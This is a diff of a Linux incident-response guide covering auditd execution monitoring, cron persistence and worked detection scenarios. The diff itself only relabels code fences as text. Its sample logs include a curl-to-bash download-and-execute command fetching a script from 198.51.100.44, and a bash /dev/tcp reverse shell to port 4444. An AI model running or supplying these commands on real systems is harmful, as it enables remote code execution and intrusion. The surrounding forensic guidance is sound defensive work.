@@ -12,7 +12,7 @@ Two gaps worth flagging up front rather than discovering mid-incident. First, Al
 
 **[ENGINEERING]** - A minimal but useful execution-visibility rule set (added via `augenrules` or directly in `/etc/audit/rules.d/`):
 
-```
+```text
 # Watch all execve syscalls, both architectures
 -a always,exit -F arch=b64 -S execve -k exec_watch
 -a always,exit -F arch=b32 -S execve -k exec_watch
@@ -58,7 +58,7 @@ Cron is still the single most common Linux persistence mechanism in incidents I'
 
 **[ANALYST]** - Execution evidence: on most distros cron logs to syslog/journal with a `CRON` program tag —
 
-```
+```text
 Sep 14 03:00:01 web01 CRON[28451]: (root) CMD (curl -s http://198.51.100.44/upd.sh | bash)
 ```
 
@@ -150,7 +150,7 @@ A reverse shell shows up as an outbound `ESTABLISHED` connection where the local
 
 ## Worked scenario: download-and-execute via curl
 
-```
+```text
 type=EXECVE argc=3 a0="bash" a1="-c" a2="curl -s http://198.51.100.44/upd.sh | bash"
 type=EXECVE argc=3 a0="curl" a1="-s" a2="http://198.51.100.44/upd.sh"
 ```
@@ -159,7 +159,7 @@ The first record is the parent shell invocation (e.g. a cron job or webshell cal
 
 ## Worked scenario: reverse shell
 
-```
+```text
 type=EXECVE argc=3 a0="bash" a1="-c" a2="bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
 ```
 
